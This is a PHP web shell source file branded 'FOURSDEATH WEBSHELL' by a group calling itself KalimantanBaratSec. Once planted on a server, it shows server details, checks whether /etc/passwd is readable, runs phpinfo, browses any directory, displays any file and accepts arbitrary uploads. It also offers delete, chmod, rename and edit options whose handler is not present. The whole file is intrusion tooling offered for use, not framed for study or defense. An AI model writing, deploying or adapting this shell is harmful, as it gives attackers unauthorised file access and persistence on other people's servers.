<?php
// ---------------------------------------------
// FOURSDEATH WEBSHELL - LANDSCAPE RESPONSIVE
// ---------------------------------------------
set_time_limit(0);
error_reporting(0);
if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
$etc_passwd = @is_readable("/etc/passwd") ? "<b><span style=\"color:white\">ON </span></b>" : "<b><span style=\"color:red\"/>off </span></b>";
echo '<!DOCTYPE HTML>
<html><head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>FOURSDEATH WEBSHELL</title>
<style>
body {
    margin:0;
    padding:10px;
    background:url(https://g.top4top.io/p_1825r6iwh0.jpg);
    background-size:cover;
    font-family:Courier New, monospace;
    color:white;
}
a {
    text-decoration:none;
    color:#33f702;
}
a:hover {
    color:white;
    text-shadow:0 0 10px #fff;
}
table {
    border:1px dotted #33f702;
    width:100%;
    max-width:1000px;
    margin:auto;
    background:rgba(0,0,0,0.6);
}
td {
    padding:5px;
}
input,select,textarea {
    background:black;
    color:white;
    border:1px solid #555;
    border-radius:5px;
}
marquee {
    color:white;
}
</style>
</head><body>
<center><h1 style="color:gold;">FOURSDEATH WEBSHELL</h1></center>
<center><h4 style="color:white;">Mini Shell</h4></center>
<center><img src="https://i.top4top.io/p_22457217t0.png" width="250" height="250"/></center>
<table><tr><td>
<b style="color:red">Server IP :</b> '.$_SERVER['SERVER_ADDR'].'<br>
<b style="color:red">Your IP :</b> '.$_SERVER['REMOTE_ADDR'].'<br>
<b style="color:red">Safe Mode :</b> ';
if( ini_get('safe_mode') ){
  echo '<font color=red><b> ON</b></font>';
}else{
  echo '<font color=green><b> OFF</b></font>';
}
echo '<br><b style="color:red">Read /etc/passwd :</b> '.$etc_passwd.'<br>';
echo '<b style="color:red">Functions :</b> <a href="?p=info">PHP INFO</a><br>';
if(@$_GET['p']=="info"){
    phpinfo(); exit;
}
echo '</td></tr></table>';

// File manager start
echo '<table><tr><td><b style="color:red">Current Path :</b> ';
if(isset($_GET['y'])){
    $path = $_GET['y'];
}else{
    $path = getcwd();
}
$path = str_replace("\\","/",$path);
$paths = explode("/", $path);
foreach($paths as $id=>$pat){
    if($pat == "" && $id == 0){
        echo '<a href="?y=/">/</a>';
        continue;
    }
    if($pat == "") continue;
    echo '<a href="?y=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr>';

// Upload form
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo "<tr><td><font color=green>Upload success.</font></td></tr>";
    }else{
        echo "<tr><td><font color=red>Upload failed.</font></td></tr>";
    }
}
echo '<tr><td><form enctype="multipart/form-data" method="POST">
<b style="color:red">File Upload:</b> <input type="file" name="file">
<input type="submit" value="Upload"></form></td></tr>';

// File content view
if(isset($_GET['filesrc'])){
    echo "<tr><td><b style='color:red'>File: </b>".htmlspecialchars($_GET['filesrc'])."</td></tr>";
    echo "<tr><td><textarea cols=100 rows=20 readonly>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></td></tr>";
}

// File manager
echo '</table><br><table>
<tr style="background:silver;color:black"><th>Name</th><th>Size</th><th>Permissions</th><th>Action</th></tr>';
$scandir = scandir($path);
foreach($scandir as $file){
    if($file == "." || $file == "..") continue;
    $fullpath = "$path/$file";
    $size = is_file($fullpath) ? filesize($fullpath)/1024 : "--";
    $size = is_numeric($size) ? round($size,2).' KB' : $size;
    echo "<tr>
    <td><a href='?y=$path/$file";
    if(is_file($fullpath)) echo "&filesrc=$fullpath";
    echo "'>$file</a></td>
    <td>$size</td>
    <td>".perms($fullpath)."</td>
    <td><form method='POST' action='?option&y=$path'>
    <select name='opt'>
        <option value=''>-</option>
        <option value='delete'>Delete</option>
        <option value='chmod'>Chmod</option>
        <option value='rename'>Rename</option>
        <option value='edit'>Edit</option>
    </select>
    <input type='hidden' name='path' value='$fullpath'>
    <input type='hidden' name='name' value='$file'>
    <input type='hidden' name='type' value='".(is_dir($fullpath)?'dir':'file')."'>
    <input type='submit' value='>'></form></td></tr>";
}
echo '</table>';

// Footer
echo '<center><br><marquee><b><font face="courier new" color="white">Foursdeath Team - KalimantanBaratSec</font></b></marquee><br>
<audio src="https://b.top4top.io/m_17923krtx0.mp3" controls autoplay loop></audio>
<script src="https://raw.githubusercontent.com/AliandiYoto/efek-salju-v.1/master/efeksalju1.js"></script></body></html>';

// Permission checker
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
